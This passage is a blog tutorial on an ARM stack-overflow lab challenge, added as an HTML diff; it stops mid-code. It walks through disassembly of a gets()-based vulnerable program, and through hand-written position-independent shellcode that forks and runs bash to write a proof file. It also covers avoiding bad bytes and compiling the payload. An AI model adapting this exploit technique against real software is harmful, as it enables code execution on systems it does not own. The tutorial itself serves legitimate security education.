@@ -1,0 +1,340 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part VI</title>
+  <meta name="description" content="Smashing ARM Stack for Fun - Part VI">
+
+  <link href='/css/load-lato-fonts.min.css' rel='stylesheet' type='text/css'>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      root: "/js/MathJax-2.7.7",
+      extensions: ["tex2jax.js"],
+      jax: ["input/TeX","output/HTML-CSS"],
+      tex2jax: {inlineMath: [["\\(","\\)"]]},
+      TeX: {
+        Macros: {
+          
+        }
+      }
+    });
+  </script>
+  <script src='/js/MathJax-2.7.7/MathJax.js' async></script>
+
+  <script src="/js/jquery-3.6.0.min.js"></script>
+
+  <script src='/js/underscore-1.9.1.min.js' ></script>
+
+  <script src='/js/d3-7.4.2.min.js'></script>
+
+  <script src='/js/venn/venn-0.2.14.min.js'></script>
+  <script src='/js/venn/helper.min.js'></script>
+
+  <script src='/js/fix_syntax_highlight.min.js'></script>
+  <link rel="stylesheet" type="text/css" href="/css/tufte.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/latex.min.css">
+
+  <link rel="canonical" href="https://book-of-gehn.github.io/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">
+
+  <link rel="stylesheet" type="text/css" href="/css/font-awesome-5.min.css">
+
+  <script src='/js/lunr-2.3.9.min.js'></script>
+  <script src='/js/search_index.js'></script>
+  <script src='/js/search.min.js'></script>
+</head>
+<body>
+<header>
+                <hgroup class="header-group">
+        <h1 class="header-title"><a href="/">The Book of Gehn</a></h1>
+                </hgroup>
+                <ul class="header-list">
+                    <li><a href="https://byexamples.github.io">byexample</a></li>
+                    <li><a href="https://bisturi.github.io">bisturi</a></li>
+                    <li>
+                        <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+                        <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+                    </li>
+                </ul>
+        
+        
+
+    
+
+    <nav class="group">
+            <form id="blog-search-form">
+                <input type="search" placeholder="+must -not *fuzzy*"></input>
+                <span class="query-error"></span>
+                <span class="controls">
+                    <button type="submit">Filter</button>
+                    <button style="display: none;" id="reset_search" type="reset">Clear</button>
+                </span>
+            </form>
+    </nav>
+
+    <div style="display: none;" id="search_error"></div>
+    <article style="display: none;" class="group" id="search_results">
+    </article>
+</header>
+<article class="group">
+<h1>
+Smashing ARM Stack for Fun - Part VI
+</h1>
+<p class="subtitle">
+January 26, 2021
+</p>
+<p>We have the same vulnerability than we have in <a href="/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-V.html">stack4</a> but this time we will make our own egg/shellcode.<!--more--></p>
+<h2 id="same-vuln">Same vuln</h2>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"> </span><span class="o">&amp;</span><span class="nv">main</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x1041c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">&gt;</span><span class="w">       </span><span class="nv">push</span><span class="w">   </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">lr</span><span class="err">}</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10420</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">add</span><span class="w">    </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10424</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">sub</span><span class="w">    </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x48</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10428</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x48]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1042c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x4c]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10430</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x44</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10434</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10438</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#gets@plt &lt;gets@plt&gt;</span><span class="w"></span>
+
+<span class="w">   </span><span class="err">0</span><span class="nf">x1043c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10440</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10444</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">pop</span><span class="w">    </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The plan is to overflow the buffer with 0x44 bytes of padding, then 4 bytes with the first return address.</p>
+<p>Nothing new. But the fun is just about to begin…</p>
+<h2 id="planning-the-eggexploit">Planning the egg/exploit</h2>
+<p>We want something standard but slightly fancy:</p>
+<ul>
+<li>spawn a shell an run an arbitrary command</li>
+<li>wait for the spawned process to finish</li>
+<li>exit the program</li>
+</ul>
+<p>This translates to the following C code:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">pid_t</span><span class="w"> </span><span class="n">child</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">child</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// child</span>
+<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;echo &#39;pwn!&#39; &gt; pwned_proof&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
+<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">envp</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span><span class="w"></span>
+<span class="w">        </span><span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="n">envp</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">child</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="c1">// parent</span>
+<span class="w">        </span><span class="n">wait4</span><span class="p">(</span><span class="n">child</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// catch all exit</span>
+<span class="w">    </span><span class="n">exit_group</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The last <code><span class="highlight-candombe-inline"><span class="n">exit_group</span><span class="w"></span></span></code> is a catch all: if <code><span class="highlight-candombe-inline"><span class="n">fork</span><span class="w"></span></span></code> fails or <code><span class="highlight-candombe-inline"><span class="n">execve</span><span class="w"></span></span></code> fails we want to have a deterministic output. The same for the parent process after <code><span class="highlight-candombe-inline"><span class="n">wait4</span><span class="w"></span></span></code>.</p>
+<h2 id="syscalls">Syscalls</h2>
+<p><label for='ClJlZmVyZW5jZXM6IFt3M2NoYWxsc10oaHR0cHM6Ly9zeXNjYWxscy53M2NoYWxscy5jb20vP2FyY2g9YXJtX3N0cm9uZykKYW5kCltMaW51eCBrZXJuZWxdKGh0dHBzOi8vZ2l0aHViLmNvbS90b3J2YWxkcy9saW51eC9ibG9iL3Y0LjE3L2FyY2gvYXJtL3Rvb2xzL3N5c2NhbGwudGJsKQogbWFyZ2lubm90ZXM=' class='margin-toggle'> &#8853;</label>
+<input type='checkbox' id='ClJlZmVyZW5jZXM6IFt3M2NoYWxsc10oaHR0cHM6Ly9zeXNjYWxscy53M2NoYWxscy5jb20vP2FyY2g9YXJtX3N0cm9uZykKYW5kCltMaW51eCBrZXJuZWxdKGh0dHBzOi8vZ2l0aHViLmNvbS90b3J2YWxkcy9saW51eC9ibG9iL3Y0LjE3L2FyY2gvYXJtL3Rvb2xzL3N5c2NhbGwudGJsKQogbWFyZ2lubm90ZXM=' class='margin-toggle'/>
+<span class='marginnote'>
+References: <a href="https://syscalls.w3challs.com/?arch=arm_strong">w3challs</a> and <a href="https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl">Linux kernel</a>
+</span></p>
+<p>This is a summary of the syscalls’ numbers and arguments:</p>
+<pre><code>            r7      r0      r1      r2      r3
+syscall     num     arg1    arg2    arg3    argv4
+fork        0x02
+execve      0x0b    &quot;/bi..&quot; argv    envp
+wait4       0x72    pid     NULL    0       NULL
+exit_group  0xf8    num</code></pre>
+<p><code><span class="highlight-candombe-inline"><span class="n">argv</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">envp</span><span class="w"></span></span></code>, are arrays of pointers with a pointer to <code><span class="highlight-candombe-inline"><span class="nb">NULL</span><span class="w"></span></span></code> marking the end of the array.</p>
+<p>In Linux it is possible to pass a <code><span class="highlight-candombe-inline"><span class="nb">NULL</span><span class="w"></span></span></code> instead an array with a single pointer to <code><span class="highlight-candombe-inline"><span class="nb">NULL</span><span class="w"></span></span></code>. This could be used for <code><span class="highlight-candombe-inline"><span class="n">envp</span><span class="w"></span></span></code>.</p>
+<p>However:</p>
+<blockquote>
+<p>On Linux, <code><span class="highlight-candombe-inline"><span class="n">argv</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">envp</span><span class="w"></span></span></code> can be specified as <code><span class="highlight-candombe-inline"><span class="nb">NULL</span><span class="w"></span></span></code>. In both cases, this has the same effect as specifying the argument as a pointer to a list containing a single null pointer. <strong>Do not take advantage of this nonstandard and nonportable misfeature!</strong> On many other UNIX systems, specifying <code><span class="highlight-candombe-inline"><span class="n">argv</span><span class="w"></span></span></code> as NULL will result in an error (<code><span class="highlight-candombe-inline"><span class="n">EFAULT</span><span class="w"></span></span></code>). <em>Some</em> other UNIX systems treat the <code><span class="highlight-candombe-inline"><span class="n">envp</span><span class="o">==</span><span class="nb">NULL</span><span class="w"></span></span></code> case the same as Linux. <cite class="epigraph"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man execve(2)</a></cite></p>
+</blockquote>
+<p>No problem! We can design a single array in the stack to fulfill both:</p>
+<p><figure><figcaption><span markdown='1'>
+<pre data-input_format="markdown" data-output_format="plain-block"><code></code></pre>
+</span></figcaption>
+<object  class='' align='middle' data='/img/arm/azeria-arm-challenges/argv.svg' type='image/svg+xml'></object></figure></p>
+<p>In assembly this translates to:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0              @; &amp;argv[3]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="nv">Largv2</span><span class="o">-</span><span class="nv">.</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>
+<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="nv">Largv1</span><span class="o">-</span><span class="nv">.</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>
+<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="nv">Largv0</span><span class="o">-</span><span class="nv">.</span><span class="o">-</span><span class="mi">8</span><span class="w">  </span><span class="err">@</span><span class="c1">; &amp;argv[0]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="err">{</span><span class="nb">r0</span><span class="o">-</span><span class="nb">r3</span><span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>But why <code><span class="highlight-candombe-inline"><span class="nf">add</span><span class="w"></span></span></code> and not <code><span class="highlight-candombe-inline"><span class="nf">mov</span><span class="w"></span></span></code>?</p>
+<h2 id="position-independent-code">Position independent code</h2>
+<p>The exploit will be loaded in a piece of executable memory but we cannot know <em>a priori</em> where.</p>
+<p>Therefore, branches and addresses <strong>must</strong> be <em>relative</em> to the program counter.</p>
+<p>We cannot just say <code><span class="highlight-candombe-inline"><span class="nf">mov</span><span class="w"> </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nv">label</span><span class="w"></span></span></code> as we will hardcoding the address of <code><span class="highlight-candombe-inline"><span class="nf">label</span><span class="w"></span></span></code>; we need to use <code><span class="highlight-candombe-inline"><span class="nf">add</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">pc</span><span class="w"></span></span></code>.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="err">00000020</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">Lchild</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+<span class="w">  </span><span class="err">20:</span><span class="w">   </span><span class="nf">e3a03000</span><span class="w">        </span><span class="nv">mov</span><span class="w">     </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">  </span><span class="err">24:</span><span class="w">   </span><span class="nf">e28f204c</span><span class="w">        </span><span class="nv">add</span><span class="w">     </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#76     ; 0x4c  argv2</span><span class="w"></span>
+<span class="w">  </span><span class="err">28:</span><span class="w">   </span><span class="nf">e28f1044</span><span class="w">        </span><span class="nv">add</span><span class="w">     </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#68     ; 0x44  argv1</span><span class="w"></span>
+<span class="w">  </span><span class="err">2</span><span class="nl">c:</span><span class="w">   </span><span class="nf">e28f0034</span><span class="w">        </span><span class="nv">add</span><span class="w">     </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#52     ; 0x34  argv0</span><span class="w"></span>
+<span class="w">  </span><span class="err">30:</span><span class="w">   </span><span class="nf">e92d000f</span><span class="w">        </span><span class="nv">push</span><span class="w">    </span><span class="err">{</span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="err">}</span><span class="w"></span>
+<span class="w">  </span><span class="err">34:</span><span class="w">   </span><span class="nf">e28d1000</span><span class="w">        </span><span class="nv">add</span><span class="w">     </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">  </span><span class="err">38:</span><span class="w">   </span><span class="nf">e28d200c</span><span class="w">        </span><span class="nv">add</span><span class="w">     </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#12</span><span class="w"></span>
+<span class="w">  </span><span class="err">3</span><span class="nl">c:</span><span class="w">   </span><span class="nf">e3a0700b</span><span class="w">        </span><span class="nv">mov</span><span class="w">     </span><span class="nb">r7</span><span class="p">,</span><span class="w"> </span><span class="c1">#11</span><span class="w"></span>
+<span class="w">  </span><span class="err">40:</span><span class="w">   </span><span class="nf">ef000000</span><span class="w">        </span><span class="nv">svc</span><span class="w">     </span><span class="mh">0x00000000</span><span class="w"></span>
+<span class="w">        </span><span class="nf">....</span><span class="w">            </span><span class="nv">....</span><span class="w"></span>
+
+<span class="err">00000068</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">Largv0</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+<span class="w">        </span><span class="nf">....</span><span class="w">            </span><span class="nv">....</span><span class="w"></span>
+<span class="err">00000074</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">Largv1</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+<span class="w">        </span><span class="nf">....</span><span class="w">            </span><span class="nv">....</span><span class="w"></span>
+<span class="err">00000078</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">Largv2</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+</code></pre></div>
+
+<p>The <code><span class="highlight-candombe-inline"><span class="nf">add</span><span class="w"></span></span></code> instructions like <code><span class="highlight-candombe-inline"><span class="nf">add</span><span class="w"> </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#76</span><span class="w"></span></span></code> makes the address relative to the program counter.</p>
+<p>To calculate the offset to a label like <code><span class="highlight-candombe-inline"><span class="nf">Largv0</span><span class="w"></span></span></code> we need to subtract the address of the label minus the current position minus 8 bytes (because <code><span class="highlight-candombe-inline"><span class="nf">pc</span><span class="w"></span></span></code> already has an implicit +0x8)</p>
+<div class="highlight-candombe"><pre><span></span><code>    <span class="mh">0x78</span> <span class="o">-</span> <span class="mh">0x24</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">=</span> <span class="mh">0x4c</span> <span class="o">=</span> <span class="mi">76</span>
+</code></pre></div>
+
+<p>Thankfully the assembler can do the calculus by us:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r2</span><span class="p">,</span><span class="w"> </span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="nv">Largv2</span><span class="o">-</span><span class="nv">.</span><span class="o">-</span><span class="mi">8</span><span class="w"></span>
+</code></pre></div>
+
+<p>And the branches?</p>
+<p><code><span class="highlight-candombe-inline"><span class="nf">bne</span><span class="w"> </span><span class="nv">Lparent_or_error</span><span class="w"></span></span></code> is a <em>PC-relative</em> encoded jump: the program will jump to that <em>absolute</em> address but the instruction is encoded as an <em>offset</em> from the current <code><span class="highlight-candombe-inline"><span class="nf">pc</span><span class="w"></span></span></code>.</p>
+<p>In other words, we are <strong>not</strong> hardcoding a fixed address so our code will work regardless of where is going to be loaded.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="err">00000000</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">egg</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+<span class="w">   </span><span class="err">0:</span><span class="w">   </span><span class="nf">e3a07002</span><span class="w">        </span><span class="nv">mov</span><span class="w">     </span><span class="nb">r7</span><span class="p">,</span><span class="w"> </span><span class="c1">#2</span><span class="w"></span>
+<span class="w">   </span><span class="err">4:</span><span class="w">   </span><span class="nf">ef000000</span><span class="w">        </span><span class="nv">svc</span><span class="w">     </span><span class="mh">0x00000000</span><span class="w"></span>
+<span class="w">   </span><span class="err">8:</span><span class="w">   </span><span class="nf">e3500000</span><span class="w">        </span><span class="nv">cmp</span><span class="w">     </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="nl">c:</span><span class="w">   </span><span class="err">1</span><span class="nf">a000000</span><span class="w">        </span><span class="nv">bne</span><span class="w">     </span><span class="mi">14</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">Lparent_or_error</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="err">10:</span><span class="w">   </span><span class="nf">ea000002</span><span class="w">        </span><span class="nv">b</span><span class="w">       </span><span class="mi">20</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">Lchild</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">        </span><span class="nf">....</span><span class="w">            </span><span class="nv">....</span><span class="w"></span>
+<span class="err">00000020</span><span class="w"> </span><span class="err">&lt;</span><span class="nf">Lchild</span><span class="o">&gt;</span><span class="p">:</span><span class="w"></span>
+<span class="w">  </span><span class="err">20:</span><span class="w">   </span><span class="nf">e3a03000</span><span class="w">        </span><span class="nv">mov</span><span class="w">     </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+</code></pre></div>
+
+<p>The address is computed as:</p>
+<div class="highlight-candombe"><pre><span></span><code>    <span class="n">pc</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span>
+</code></pre></div>
+
+<p>The branch at 0x10 has the offset 0x02 encoded in the instruction 0xea000002. Knowing that the offset is multiplied by 4 (because the addresses are aligned to 4 bytes; 2 in Thumb mode), and knowing that using <code><span class="highlight-candombe-inline"><span class="nf">pc</span><span class="w"></span></span></code> adds a 0x8 to the count (0x4 in Thumb mode), the final address is:</p>
+<div class="highlight-candombe"><pre><span></span><code>    <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">=</span> <span class="mh">0x20</span>
+</code></pre></div>
+
+<p>Why did I use <code><span class="highlight-candombe-inline"><span class="nf">bne</span><span class="w"></span></span></code> instead of <code><span class="highlight-candombe-inline"><span class="nf">beq</span><span class="w"></span></span></code> ? Wouldn’t that be more direct?</p>
+<h2 id="forbidden-bytes">Forbidden bytes</h2>
+<p>The vulnerable program will read our exploit using <code><span class="highlight-candombe-inline"><span class="n">gets</span><span class="w"></span></span></code>.</p>
+<p>From the <a href="https://man7.org/linux/man-pages/man3/gets.3.html">man pages</a>, <code><span class="highlight-candombe-inline"><span class="n">gets</span><span class="w"></span></span></code> reads from <code><span class="highlight-candombe-inline"><span class="n">stdin</span><span class="w"></span></span></code> until it finds a <em>termination character</em> or it is the end of the stream.</p>
+<p>In Linux, the new line (<code><span class="highlight-candombe-inline"><span class="err">\</span><span class="n">n</span><span class="w"></span></span></code> 0x0a) is the <em>termination character</em> so our payload cannot have this byte or <code><span class="highlight-candombe-inline"><span class="n">gets</span><span class="w"></span></span></code> will stop in the middle of the copy.</p>
+<p>For example the simple snippet is forbidden:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">    </span><span class="nf">beq</span><span class="w"> </span><span class="nv">Lchild</span><span class="w"></span>
+<span class="w">    </span><span class="err">@</span><span class="c1">; code for parent or error follows</span><span class="w"></span>
+</code></pre></div>
+
+<p><label for='CkJ5cGFzc2luZyB0aGUgZmlsdGVycyBjYW4gYmUgaW5jcmVkaWJsZSBjb21wbGV4LiBIZXJlIGlzIGFydGljbGUgYWJvdXQKW0FscGhhbnVtZXJpYyBSSVNDIEFSTSBTaGVsbGNvZGVdKGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDIwKi9odHRwOi8vd3d3LnBocmFjay5vcmcvaXNzdWVzLzY2LzEyLmh0bWwpLgptYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
+<input type='checkbox' id='CkJ5cGFzc2luZyB0aGUgZmlsdGVycyBjYW4gYmUgaW5jcmVkaWJsZSBjb21wbGV4LiBIZXJlIGlzIGFydGljbGUgYWJvdXQKW0FscGhhbnVtZXJpYyBSSVNDIEFSTSBTaGVsbGNvZGVdKGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDIwKi9odHRwOi8vd3d3LnBocmFjay5vcmcvaXNzdWVzLzY2LzEyLmh0bWwpLgptYXJnaW5ub3Rlcw==' class='margin-toggle'/>
+<span class='marginnote'>
+Bypassing the filters can be incredible complex. Here is article about <a href="https://web.archive.org/web/2020*/http://www.phrack.org/issues/66/12.html">Alphanumeric RISC ARM Shellcode</a>.
+</span></p>
+<p><code><span class="highlight-candombe-inline"><span class="nf">beq</span><span class="w"></span></span></code> has a 0x0a as the first byte so we have to rewrite the snippet to:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">    </span><span class="nf">bne</span><span class="w"> </span><span class="nv">Lparent_or_error</span><span class="w"></span>
+<span class="w">    </span><span class="nf">b</span><span class="w"> </span><span class="nv">Lchild</span><span class="w"></span>
+</code></pre></div>
+
+<h2 id="compilation">Compilation</h2>
+<p>We compile the assembly into an object file with <code><span class="highlight-candombe-inline"><span class="n">gcc</span><span class="w"></span></span></code> (in a Raspbian) and then we extract the <code><span class="highlight-candombe-inline"><span class="nf">.text</span><span class="w"></span></span></code> section:</p>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ gcc -c -o egg.o egg.s
+pi@raspberrypi:~$ objcopy -O binary --only-section<span class="o">=</span>.text egg.o egg.text
+</code></pre></div>
+
+<p>The assembly can be found <a href="/assets/arm/azeria-arm-challenges/egg.s">here</a>.</p>
+<h2 id="testing">Testing</h2>
+<p>It is always a good idea to test the shellcode <em>separately</em> from the exploitation.</p>
+<p>For this <a href="/assets/arm/azeria-arm-challenges/test-egg.c">we can create a small C program</a> to load the <em>egg</em> from a file into a buffer with <em>permission for execution</em> and then jump into it:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">posix_memalign</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">ALIGN</span><span class="p">,</span><span class="w"> </span><span class="n">fsize</span><span class="p">);</span><span class="w"></span>
